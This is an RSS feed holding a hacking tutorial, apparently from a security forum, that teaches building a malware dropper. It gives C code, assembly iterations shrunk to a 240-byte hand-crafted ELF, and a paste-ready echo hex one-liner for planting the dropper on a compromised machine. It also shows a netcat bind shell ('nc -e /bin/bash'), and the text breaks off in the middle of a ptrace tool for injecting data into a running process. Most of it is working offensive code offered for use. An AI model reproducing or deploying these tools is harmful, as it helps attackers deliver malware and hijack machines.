<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Programming for Wannabes. Part V. A Dropper</title>
    <link>https://d.clarkee.co.uk/t/programming-for-wannabes-part-v-a-dropper/23090</link>
    <description>So far we have been much focused on reverse engineering, but everybody knows that in order to become a hacker you have to master much more than that. So in this installment we will be moving forward and making use of all the stuff we had learned till now in order to get started with network programming.

We will start with something very simple but that will allow us to use everything we had already learnt at the same time that we dive into networking. For this purpose we will be writing a dropper.

A dropper is a program, usually very small, so it gets more chances to get transferred to a remote machine and whose goal is to download other files, usually bigger parts of some malware too big to fit as part of an exploit.

This may sound cool to some of you, but we are basically going to write a program to transfer files between two machines. And we will try to make this program very, very small. Hopefully this will throw some light about that question on which language you should use to write malware...

# A simple dropper

Let&#39;s start writing our dropper in C. The program is going to be very simple. We will create a TCP connection to some fixed machine and write to `stdout` anything received from that connection.

In order to test the dropper in your machine, you will need two terminals. One will be play the role of the malware server, i.e. the machine containing a full-fledge malware we want to transfer to the compromised machine. For our purpose this will just be:

```bash
malware_server $ cat /usr/bin/xeyes | nc -l -p $((1111))
```

This line simulates a TCP server listening on port `0x1111` that will send the program `xeyes` to any one connecting to it. To test this, open another terminal and run the following command:

```bash
compromised_machine $ rm k; nc localhost $((1111)) &gt; k; chmod +x k; ./k
```

You can try this line and get those fancy eyes up following your mouse on the screen.

So, what we are going to write is a program to do what `nc` does in the example above. Yes, you can use `nc` or similar tools whenever possible, but we are here trying to be wannabees... and for that we need to be able to build any single tool we will every use... that&#39;s the difference between script kids and hackers... I think :)

# Minimal C Dropper

So let&#39;s take a look to a minimal dropper, and let&#39;s use that code to introduce new C language concepts and start our journey. The code is this:

```C
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;

#define BUF_SIZE 1024

int main (void) {
  int                s, l;
  unsigned long      addr =  0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) return -2;
  if (connect (s, (struct sockaddr*)&amp;addr, 16) &lt; 0)         return -3;
  
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }
  close (s);
  
  return 0;
  
}
```

Not bad. You already know everything about the header files. the `main` function and how to declare basic integer variables of different sizes, so I will not insist on this anymore. The rest of the code only contains stuff you already know, except for the `while` loop. But we will get to it eventually.

So the first thing we find is a call to a function named `socket`. This is actually a system call and in that sense it is not different of the `_exit` or `write` system call we were using in the previous instalments. This just do something different.

The `socket` system call allows us to create a socket. In the same way than a file allows us to use the hard drive (and I know we haven&#39;t talked about this yet), a socket is the way the operating system give to us in order to use network interface.

The socket can be of different types. Just like the files that can be text or binary files, sockets also have different types. For now, and in order to keep this simple, we will just care about internet sockets or, being more pro TCP/IP. The first and third parameter we pass to `socket` defines that. The second parameter indicates the type of connection we want. It can be a `STREAM` connection like in this code, or a `DGRAM` _connection_ (actually this is used for connection-less communications). Without going into protocol details, a `SOCK_STREAM` allows us to talk `TCP`, while a SOC_DGRAM` allows us to speak &#39;UDP&#39;.

Therefore, the first code line in the program creates a path to the network hardware and also tell the operating system that we want to talk to a remote machine over the Internet and using TCP.

_There are other types of Protocol Families and socket types. But for the time being, just pay attention to the second parameter and that will be enough to write a whole bunch of tools_

# Connecting

You may had noted that the type of our socket is `STREAM, so our communication will flow like a stream, but, before we can do that, we need to set where to connect this stream. Using technical jargon, TCP is an connection-oriented protocol, meaning than, before any data can be exchanged a connection needs to be established. Once established we can just write and read data from the socket and that data will go to the right machine automatically.

This is different to the `DGRAM` type where, there is no connection, and for each piece of data we want to send (this is called technically a datagram) we always need to indicate the destination. 

In other words. TCP is like making a phone call and UDP is like sending a letter.

So, we need to make the call, and this is done with the `connect` system call. Yes. This is also a system call so we are still in our comfort zone.

As TCP is a so-called transport protocol it defines the network locations as network addresses and ports. In general a network address identifies a machine and a port a service within that machine. So, we need to specify an IP address and a port. In our case we will be using local host (`127.0.0.1`) and port `0x1111`... the values we used at the very beginning of the text with our `nc` example.

In order to specify this, we would usually make use of a C structure, but we haven&#39;t talked about structures yet... Well we can briefly talk about them right now. A structure is a compound data type that allows us to pack together multiple simple datatypes. In general, everything we declare in a structure is stored in memory in sequence, that means that we can always access that memory using different ways.

In our example, we are not using the structure, but if we did, it will look like this:

```
struct ip_addr {
	unsigned short family;
	unsigned short port;
	unsigned char ip[4];
}
```

When using the structure we can access the different fields using the identifier indicated inside the `struct` declaration. In this case, the whole structure is 8 bytes long so it fits in a `long`. And that is what we had done in our program.


     0x0100007f11110002 -&gt; 01    --&gt; 01
                           00    --&gt; 00
	    				   00    --&gt; 00
		    			   7f    --&gt; 127
			    		   1111  --&gt; Port
				    	   0002  --&gt; Address Family



So both things are actually the same thing. However, note that for normal programs (those that are not that cool as this one we are writing right now), you shouldn&#39;t do this. Structures are there for good reasons, usually to ensure portability and make your program work with other protocol families, and addresses formats.

Anyway... that long number is all the information we need to connect to our malware server.

The last parameter to `connect` is the length of the structure passed as second parameter. Yes, it is 16 and not 8. The original structure, named `struct sockaddr` has a 8 bytes padding field. The size is required in order to support other protocols, where the machines or services are addressed in a different way and may need more or less space to get stored. Think for instance on Bluetooth where the devices are addressed using is BT address (kind of a MAC address).

So, the `connect` system call does all the TCP magic (send those `SYNC` and `SYNC/ACK` packets you may have heard about) and connects our socket (the one we created using `socket`) with the remote machine we specified in the address. At this point, anything we write in each of the ends of the connection will just get to the other side.

# Save the data

Now we just need to read what the server is sending and drop it somewhere. Instead of opening a file and save the data directly there we had opted to write to `stdout` and let the shell redirection operations do the magic. Exactly as shown at the beginning with `nc`.

The code that does this is repeated here for the readers convenience:

```C
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) &lt;= 0) break;
    write (1, buf, l);
    if (l &lt; BUF_SIZE) break;
  }

```

This is a `while` loop. Basically it repeats whatever is after the `while (cond)` while the condition is true. In the example above we have set what is known as an infinite loop. As the condition is always true, the block affected by the `while` will repeat forever... Well actually until we leave it with the `break` keyword.

With this information, and making use of our knowledge about the `write` system call from previous instalments, we can easily infer that the `read` system call will read data from the indicated file descriptor (in this case it is a socket so data will be read from the network) and stores it in the indicated buffer. It will try to read as many data as the third parameter specify. As all other system calls, it will return `-1` in case of error. Otherwise `read` returns the number of bytes actually read. So we will be reading data from the network in blocks of `BUF_SIZE` bytes or less until there is nothing left (`read` will return 0 in that case) or an error occurs.

Then, the data we have just read we will write to `stdout` (remember file descriptor 1). The loop will finish whenever we read a block from the network with a size less than the designated buffer size.

Now we can compile our C program and test it using the setup we described earlier in this text.

In one console let&#39;s launch the server:

    malware_server $ cat /usr/bin/xeyes | nc -l -p $((0x1111))
	
In other console, let&#39;s compile and launch our dropper. I have named it `nwget_basic.c`

    compromised_machine $ make nwget_basic
	compromised_machine $ rm k; ./nwget_basic &gt; k; chmod +x k; ./k
	
If everything goes well, you should see those eyes staring at your mouse pointer

# Shrinking the dropper

Sometimes getting a file into a machine is tricky. This may happen even with non security related scenarios. I have been in those cases were I need to transfer a file into a machine that does not have any tool to transfer files... Once I had `ssh` access to it but no `scp`. In general, if you can get to a shell in the machine there should be some way to get your files also there, but that is not always easy.

In other occasions, you just have a exploit that allows you to run a very small code, or transfer a few bytes. Anyway, in general, the smaller your dropper the better so we are going to shrink it as much as we could. And we already know how to do this, so I will just go quick with this. We will just substitute the system calls for assembly versions and get rid of the libc.

You can find the code in my github and try to recompile it yourself... or even better, you can try to write it based on what we discussed on Part II. Using this technique I manage to get my dropper down to 1.8Kb static binary (that means that I do not depend on any specific library whatsoever).

But we can do way better re-writing it in asm.

# pwget (picoWget)

No, the name is not because of me. It is because the previous one was `nwget` or nanoWget, so we are going smaller this time. `pwget` is the direct asm translation of `nwget` and this is how it looks like:

```nasm
section	.text
global _start

_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  rdi, 2		; PF_INET 2
	mov  rsi, 1		; SOCK_STREAM
	mov  rdx, 6     ; IPPROTO_TCP
	mov  r8, 10 
	call _socket
	mov  [rbp + 0x00], rax	; Store socket in stack
	cmp  rax, 0
	jle  error

	;; connect (s [rbp+0], addr, 16)
	mov  rdi, rax
	lea  rsi, [rel addr]
	mov  rdx, 16
	mov  r8, 20
	call _connect
	test eax, eax
	jl error

l0:	; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	mov rdi, 2
	lea rsi, [rel msg]
	mov rdx, 7
	call _write
	
	mov rdi, r9
	add rdi, r8
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	syscall
	ret
	
_write:
	mov rax, 1
	syscall
	ret
	
_socket:
	mov rax, 41
	syscall
	ret
	
_connect:
	mov rax, 42
	syscall
	ret
	
_close:	mov rax, 3
	syscall
	ret
	
_exit:	mov rax, 60
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db &quot;ERROR&quot;, 10,0

```


Despite the `jX` instruction everything should look very familiar and easy to understand to you. As I said this is the literal translation of the C program we had just discussed. The `jX` instruction performs jump based on the flag values. Flags get updated by the ALU whenever any logic or arithmetic operation is performer. The flags usually stored in a special register and each flag is a bit of that register. This way when using for instance the instruction `cmp` that allows us to compare two values, the `zero` flag will get activated when both values are equal and the `sign` flag will be activated depending on the result of the substraction of both values.

This way, after running a `cmp` instruction we can jump if the result of the comparison is `less than` with a `jl` or `less than or equal` with a `jle`... It is just that simple. Just look for the conditional jump instructions list for your processor and take a look to the available mnemonics.

This asm, once compiled and `stripped` goes down to 584 bytes. That is quite small.

# Getting rid of everything else

Obviously our code is less than 500 bytes, so the file has still some information there that shouldn&#39;t be strictly necessary. If we run it through `readelf` we will see still some remaining information:

```
$ readelf -a pwget
$ readelf -a pget
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              2&#39;s complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400080
  Start of program headers:          64 (bytes into file)
  Start of section headers:          392 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         1
  Size of section headers:           64 (bytes)
  Number of section headers:         3
  Section header string table index: 2

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .text             PROGBITS         0000000000400080  00000080
       00000000000000f6  0000000000000000  AX       0     0     16
  [ 2] .shstrtab         STRTAB           0000000000000000  00000176
       0000000000000011  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)

There are no section groups in this file.

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
                 0x0000000000000176 0x0000000000000176  R E    0x200000

 Section to Segment mapping:
  Segment Sections...
   00     .text

There is no dynamic section in this file.

There are no relocations in this file.

The decoding of unwind sections for machine type Advanced Micro Devices X86-64 is not currently supported.

No version information found in this file.

```

We can do better, completely crafting our ELF file. And this will bring us to `fwget1`

# fwget (FemtoWget)

This has already been mentioned in the forum. You can refer to [this](https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7) to see what we are talking about and based on that, we will get something like this:

```
BITS 64
	        org 0x400000
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, &quot;ELF&quot;, 2, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr


	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

	;;  https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791/7
_start:
	push rbp
	mov  rbp, rsp
	sub  rsp, 1024 + 8 + 8	; Read buffer + Socket + size 
	
	;; Variables
	;; [rbp + 0x00] -&gt; s (socket)
	;; [rbp + 0x08] -&gt; len (int)
	;; [rbp + 0x10] -&gt; buf (unsigned char)
	;; Create socket
	;; Find contants with: grep -R CONSTANT /usr/include
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov rdi, 2		; PF_INET 2
	mov rsi, 1		; SOCK_STREAM
	mov rdx, 6              ; IPPROTO_TCP
	call _socket
	
	mov [rbp + 0x00], rax
	cmp rax, 0
	jle error
	

	;; connect (s [rbp+0], addr, 16)
	mov rdi, rax
	;; 	mov rsi, 0x8c0aa8c011110002
	;; 	mov rsi, 0x0100007f11110002
	lea rsi, [rel addr]
	mov rdx, 16
	call _connect
	test eax, eax
	jl error

l0:				; Read loop
	;; Read data from socket
	;; _read (s = [rbp + 0], [rbp + 0x10], 1024);
	mov rdi, [rbp + 0]
	lea rsi, [rbp+0x10]
	mov rdx, 1024
	call _read
	mov [rbp + 0x08], rax	; Store number of bytes read
	cmp rax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rbp+0x10], [rbp+0x08])
	mov rdi, 1
	mov rdx, rax
	call _write
	cmp rax, 1024
	jl done
	jmp l0
done:
	;;  _close (s)
	mov rdi, [rbp + 0x00]	;
	call _close
	
	mov rdi, 0		; Success
	call _exit

error:
	;; mov rdi, 2
	;; lea rsi, [rel msg]
	;; mov rdx, 7
	;; call _write
	
	mov rdi, -1
	call _exit
	
	;; Syscalls
_read:
	mov rax, 0
	jmp _do_syscall
	
_write:
	mov rax, 1
	jmp _do_syscall
	
_socket:
	mov rax, 41
	jmp _do_syscall
	
_connect:
	mov rax, 42
	jmp _do_syscall
	
_close:
	mov rax, 3
	jmp _do_syscall
	
_exit:
	mov rax, 60
	jmp _do_syscall

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
msg  db &quot;ERROR&quot;, 10,0
filesize equ $ - $$

```

The code is identical to `pwget` but we have added the ELF metadata manually and also removed the `.data` section and added the data we need directly on the `.text` segment. When compiled the program goes down to 327 bytes. What is very good.... but we can do better

# Iteration 2

For starters let&#39;s remove the error checking for the `socket` system call. Sure it may fail, but that is very unlikely so that is a reasonable risk. We will also store the socket in a register instead of in the stack. We have plenty of registers that we are not using, so let&#39;s put them to work. We will use `r8` for this purpose and, therefore all references to `[rbp + 0x00]` will be gone.

We will also use the 32bits version of some registers in some operations. Opcodes involving 32bits registers are shorter. For instance:

    cmp rax, 0  -&gt; 48 83 f8 00
    cmp eax, 0  -&gt; 83 f8 00
	
And also combine this with classical optimisations like using `xor` to set register to zero instead of `mov`

    mov    rdi,0x0   --&gt; 48 c7 c7 00 00 00 00
	     ||
		 \/
    xor    rdi,rdi   --&gt; 48 31 ff
	     ||
		 \/
    xor    edi,edi   --&gt; 31 ff

Using this tricks we made the binary go down to 304 bytes.... but we can do better

# Iteration 3

For iteration 3 we are going to remove unneeded code. Actually it is not unneeded and in the general case is code that has to be there. For this specific case were our objective is to make the program as small as we can, we can overlook this.

We are removing in this iteration:

* Error code check for the `connect` system call... Basically in this case it doesn&#39;t matter if the program fails in an ordered way or it just doesn&#39;t work. The overall result is the same
* `close` syscall in the socket. All file descriptors are closed automatically by the OS when the process ends, so we can also save that one.

Regarding the code, we optimised the way `rax` is set for the different syscalls. 

     mov rax, 41  -&gt; 48 c7 c0 29 00 00 00
	    ||
		\/
	 xor eax,eax  -&gt; 31 c0
	 add eax,41   -&gt; 83 c0 29

With this changes we have gone down to 273 bytes... But we can do better

# Iteration 4

In the iteration 4 we go even more aggressive. Let&#39;s take a look to the changes

First, we reuse the 8 bytes reserved in the ELF header to add the initial code instructions. Something like this:

```
BITS 64
                  org 0x400000
    ehdr:                                                 ; Elf32_Ehdr
                  db      0x7F, &quot;ELF&quot;, 2, 1, 1, 0         ;   e_ident
  _start: 
                  push rbp                ; 55
                  mov  rbp, rsp           ; 48 89 e5
                  xor esi,esi
                  jmp _start1             ; eb XX

                  dw      2                               ;   e_type
                  dw      0x3e                            ;   e_machin
                  dq      _start                          ;   e_entry

```

As you can see, we can actually use only 6 bytes in the header as the last 2 are needed to jump into the rest of the code

We also removed the exit code... as we do not really care in this case and changed some instructions to use 32bits registers, saving a few bytes.

With this changes we go down to 263 bytes. As you can imagine from this point on, we are just saving a few bytes in each iteration, but let&#39;s see how far can we get.

# Iteration 5

If you have been following this series you should be familiar with the concept of stack frame. You may remember that we mentioned how useful it is, but that it is not always needed....Well, this is one of those cases.

So, in this iteration we remove the stack frame of our program. Other than that, we just applied some minor tweaks here and there. This is how the final version looks like

```
BITS 64
;;; ELF header.... we make use of the 8 bytes available in the header
	org 0x400000
BUF_SIZE:	equ 1024
  ehdr:                                                 ; Elf64_Ehdr
                db      0x7F, &quot;ELF&quot;, 2, 1, 1, 0         ;   e_ident
_start:
  	            xor edi,edi		; 31 ff  - Sets EDI to 0
	            inc edi         ; ff c7  - Sets EDI to 1
	            push rdi		; 57
	            pop  rsi		; 5e     - Sets RSO to 1
	            jmp _start1		; eb XX 


                dw      2                               ;   e_type
                dw      0x3e                            ;   e_machine
                dd      1                               ;   e_version
                dq      _start                          ;   e_entry
                dq      phdr - $$                       ;   e_phoff
                dq      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      5                               ;   p_offset
	        dq      0
                dq      $$                              ;   p_vaddr
                dq      $$                              ;   p_paddr
                dq      filesize                        ;   p_filesz
                dq      filesize                        ;   p_memsz
                dq      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr

	;;  Compile
	;; nasm -f bin -o fwget fwget.asm; chmod +x fwget

_start1:
	inc edi                 ; Set EDI to 2
	mov edx, 6              ; IPPROTO_TCP
	
	;; socket (AF_INET=2, SOCK_STREAM = 1, IPPROTO_TCP=6)
	call _socket
	mov ebx, eax		; Store socket on ebx
	;;  It is unlikely that the socket syscall will fail. No check for errors

	;; connect (s [rbp+0], addr, 16)
	mov edi, eax		; Saves 1 byte
	lea rsi, [rel addr]
	add edx,10
	
	call _connect
	;;	Just skip error check... if it fails is not gonna work anyway
	
	lea rsi, [rsp]	 ; Just use the stack as buffer.... we should decrement it
l0:				; Read loop
	;; Read data from socket
	;; _read (s = rbx, buf= [rsp], 1024);

	mov edi, ebx
	mov edx, BUF_SIZE
	call _read
	cmp eax, 0
	jle done

	;; Write to stdout
	;; _write (1, [rsp], rax)
	xor edi,edi
	inc edi			; rdi = 1
	mov edx, eax		; get len from _read
	call _write
	cmp eax, BUF_SIZE
	jl done
	jmp l0
done:
	;;  _close (s)
	;;	File descriptors get closed automatically when the process dies

	;; We do not care about exit code
	call _exit		
	
	;; Syscalls
_read:
	xor eax,eax
	jmp _do_syscall
	
_write:
	xor eax,eax
	inc eax

	jmp _do_syscall
	
_socket:
	;; mov rax, 41
	xor eax,eax
	add al, 41
	jmp _do_syscall
	
_connect:
	;; 	mov rax, 42
	xor eax,eax
	add al, 42
	jmp _do_syscall
	
_close:
	;; mov rax, 3
	xor eax,eax
	add al, 3
	jmp _do_syscall
	
_exit:
	xor eax,eax
	add al, 60

_do_syscall:
	syscall
	ret
	
addr dq 0x0100007f11110002
filesize equ $ - $$

```

This version is 240 bytes long and it is suitable to be dropped using a single `echo`.

```
echo -n -e &quot;\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x31\\xff\\xff\\xc7\\x57\\x5e\\xeb\\x68\\x02\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\x08\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xc7\\xba\\x06\\x00\\x00\\x00\\xe8\\x4b\\x00\\x00\\x00\\x89\\xc3\\x89\\xc7\\x48\\x8d\\x35\\x59\\x00\\x00\\x00\\x83\\xc2\\x0a\\xe8\\x3e\\x00\\x00\\x00\\x48\\x8d\\x34\\x24\\x89\\xdf\\xba\\x00\\x04\\x00\\x00\\xe8\\x1e\\x00\\x00\\x00\\x83\\xf8\\x00\\x7e\\x14\\x31\\xff\\xff\\xc7\\x89\\xc2\\xe8\\x12\\x00\\x00\\x00\\x3d\\x00\\x04\\x00\\x00\\x7c\\x02\\xeb\\xdb\\xe8\\x1c\\x00\\x00\\x00\\x31\\xc0\\xeb\\x1c\\x31\\xc0\\xff\\xc0\\xeb\\x16\\x31\\xc0\\x04\\x29\\xeb\\x10\\x31\\xc0\\x04\\x2a\\xeb\\x0a\\x31\\xc0\\x04\\x03\\xeb\\x04\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xc3\\x02\\x00\\x11\\x11\\x7f\\x00\\x00\\x01&quot; &gt; fwget; chmod +x fwget

```

In other words, it is small enough to be typed manually :). In case some compressor is available on the target machine a few more bytes could be saved, but not much more.


# Final word about the dropper

As you may have noticed, this dropper connects to a hard-coded machine. Be free to add some extra code to process command-line arguments and made this value a parameter (the command-line parameters are passed to `_start` in the stack), but that will just increase the size of our dropper. 

You can easily recompile your dropper with a new IP/Port or just write a small program/script to patch the binary. This I&#39;ll leave as an exercise for the reader.

# Dropping a Dropper like a pro

At this point, we are done with this lesson, but as this was a little bit light, let&#39;s add a bit of coolness. Yes, sure, we can drop our dropper just pasting the previous `echo` command in our interactive console, or redirecting the file using whatever tool we already use to get into our interactive session. But, let&#39;s face it. That is a pretty boring way of doing it.

So, what we are going to do is to attach to the interactive shell program (in this example we will be using `nc`), and drop our commands directly on the open socket to the remote machine. In order to figure out which socket you need to write to, we can check `/proc/PID/fd`. Let&#39;s setup our environment.

Suppose we have got access to machine `target` and started a remove shell using `nc.openbsd` (the other one does not have the flag `-e`). Something like this:

    hacker@target $ nc -e /bin/bash -l -p 1234
	
Now, from the hackers machine we can start a remote shell session like this:

    hacker@hackerbox $ nc target 1234
	
At this point, we have a TCP connection to machine `target` going on. If we now get the pid can check the open file descriptors for this process:

    hacker@hackerbox $ ps ax | grep &quot;nc target&quot; | head -1
     8095 pts/37   S+     0:00 nc target 1234
	hacker@hackerbox $ ls -l /proc/8095/fd
	total 0
	lrwx------ 1 pico pico 64 Sep 12 11:25 0 -&gt; /dev/pts/37
	lrwx------ 1 pico pico 64 Sep 12 11:25 1 -&gt; /dev/pts/37
	lrwx------ 1 pico pico 64 Sep 12 11:25 2 -&gt; /dev/pts/37
	lr-x------ 1 pico pico 64 Sep 12 11:25 3 -&gt; &#39;pipe:[45281146]&#39;
	l-wx------ 1 pico pico 64 Sep 12 11:25 4 -&gt; &#39;pipe:[45281146]&#39;
	lrwx------ 1 pico pico 64 Sep 12 11:25 5 -&gt; &#39;socket:[60870195]&#39;

	
Here we can see the three first file descriptors associated to the pseudoterminal, namely: `stdin`, `stdout` and `stderr`. Then a `pipe` what I&#39;m not sure why it is created for, but it would be a nice exercise to check it out.

Finally, we can see that file descriptor 5 is our socket... So now we know where to write our stuff.

# Attaching to the process. Meeting `ptrace`

It is time to start writing our cool tool. It will attach to any process as a debugger and write some data to a given file descriptor within that process. The way to achieve this is using the system call `ptrace`.

Again, the program may look complex at first glance, but it is just a basic sequence of system calls being executed sequentially... Actually it is just one single system call (`ptrace`) being executed with different parameters.

I will not put all the code here. You can find it on my [github repository](https://github.com/0x00pf/0x00sec_code). Here I will just include the relevant parts of the program.

So, the first thing we have to do, as indicated before is to get attached to the indicated process:

```C
  _pid = atoi (argv[1]);

  printf (&quot;+ Attaching to process %ld\n&quot;, _pid);
  if ((ptrace (PTRACE_ATTACH, _pid, NULL, NULL)) &lt; 0)
    perror (&quot;ptrace_attach:&quot;);
  
  printf (&quot;%s&quot;, &quot; ..... Waiting for process...\n&quot;);
  wait (&amp;status);
```
The `atoi` function at the beginning allows us to convert a string (`Ascii`) to an number (`Integer`)(`AsciiTOInteger` -&gt; `atoi`). Yes, we are passing the `pid` to attach to as a parameter to our program. Then we just find the `ptrace` system call being invoked with the _request_ `PTRACE_ATTACH` that allows us to get attached to the process indicated by the second parameter. Parameters 3 and 4 are not used for this request.

After issuing this request, we need to wait for the process to stop and give us back the control. This we do using the system call `wait`.

At this point we have full access to the process and we can do whatever we want with it.

_Note: You need to have enough permissions to be able to attach to a running process_

# Preparing code injection

Now we have to do some tasks to be able to execute some code from within the process being controlled. The first thing we do is to retrieve the current registers values. We will be using these values to run our code but also, we want to restore everything to the previous state when we are done, so our remote shell session continues working normally.

```
  if ((ptrace (PTRACE_GETREGS, _pid, 0, &amp;regs)) &lt; 0) 
      perror (&quot;ptrace_get_regs:&quot;);
  memcpy (&amp;regs_cpy, &amp;regs, sizeof (struct user_regs_struct));
```

Pretty straight forward isn&#39;t it?. After getting the registers we made a copy that we will be using during the clean-up to get everything as it was before we break into the process.

The other thing we have to do is to save the current instruction being executed. Ok, this looks like a good time to further explain what we are going to do.

In order to write into a file descriptor, we have to issue the `write` system call. As we know, to run a system call we just need to set our registers and then run the `syscall` instruction. We can deal with the registers separately using the `PTRACE_GETREGS` (yes, sure, there is a `PTRACE_SETREGS` also, so we are done there), but we need to run the `syscall` instruction. For doing that we have 2 options:

* We scan the memory looking for the instruction and set `RIP` to point there so when we re-start the process that instruction get executed...
* Or we just insert the `syscall` instruction at whatever place. In that case, we need to store the previous value at that position, in order to restore it once our system call has been executed.

We chose the second option, so we need to get the current opcode and overwrite it:

```
 if ((opcode = ptrace (PTRACE_PEEKTEXT, _pid, regs.rip, 0)) &lt; 0)
    perror (&quot;retrieve opcode:&quot;);
(...)
  ptrace (PTRACE_POKETEXT, _pid, regs.rip, 0x050f050f050f050f);
	
```
	
Also pretty straightforward. We use `PTRACE_PEEKTEXT` to read the current opcode (the one `RIP` is pointing to, and then we inject our `syscall` instruction (`0x05 0x0f`). To be honest I didn&#39;t bother to figure out, if the opcodes should be in the lower part of the long or in the high.... I just filled the whole 8 bytes with the opcode to be sure. Anyways, `ptrace` will write the 8 bytes...

# Allocating a buffer and filling it

We are almost ready to run our `write` system call. We just need a buffer to hold the data we want to send through the socket.

Again, we can do this in many different ways:

* We can overwrite part of the `text` segment with our data and then restore it as we have done with the opcode in the previous section.
* Doing something similar on the `data` segment
* Actually allocate memory using `brk` and then release it
* Or just use the stack

So, we went for the last option as it was the simplest. We just make some room in the `stack` to be sure we do not overwrite any previous data in there when we write our data. We do not need to do anything else, at the end of the process, when we restore the original register values, the stack pointer will go back to the right position and all the memory we used will immediately be recover.

We wrote a simple function to poke arbitrary strings in the stack. The function looks like this:

```
int cpy_str (pid_t _pid, char *str, unsigned long long int *p) {
  int                     i;
  int                     len = strlen (str);
  int                     len1 = (len / 8) + 1;
  char                   *aux = malloc (len1 * 8);
  unsigned long long int *d = (unsigned long long int*)aux;

  printf (&quot;!! Reallocating %d to %d bytes\n&quot;, len, len1);
  memset (aux, 0, len1);
  strcpy (d, str);
  
  for (i = 0; i &lt; len1 + 1; i++)    {
